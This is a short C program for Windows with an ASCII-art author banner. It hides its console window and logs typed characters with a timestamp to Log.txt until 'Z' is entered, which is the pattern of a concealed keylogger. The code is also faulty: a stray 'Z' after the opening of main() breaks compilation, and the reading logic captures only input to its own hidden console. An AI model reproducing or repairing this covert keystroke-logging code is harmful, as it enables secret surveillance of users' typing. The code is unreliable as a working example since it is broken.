/*
 ______   _________ _      _       _
|  ____ \|___   ___| |    | |     | |
| |    \ \   | |   | |____| |     | |
| |    | |   | |   |  ____  |     | |
| |____/ /___| |___| |    | |_____| |
|_______/|_________|_|    |_________|xsd
M A H I R     L A B I B     D I H A N

*/
#include <stdio.h>
#include <windows.h>

TCHAR getch() {
  DWORD mode, cc;
  HANDLE h = GetStdHandle( STD_INPUT_HANDLE );
  if (h == NULL) {
        return 0; // console not found
  }
  GetConsoleMode( h, &mode );
  SetConsoleMode( h, mode & ~(ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT) );
  TCHAR c = 0;
  ReadConsole( h, &c, 1, &cc, NULL );
  SetConsoleMode( h, mode );
  return c;
}
 
int main() {Z
    TCHAR k;
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
    FILE* file = fopen("Log.txt", "a+");
    fprintf(file,"\n\n%s  %s\n\n",__TIME__,__DATE__);
    while ((k = getch()) != 'Z') {
        fputc(k,file);
        fflush(file);
    }
    fclose(file);
    return 0;
}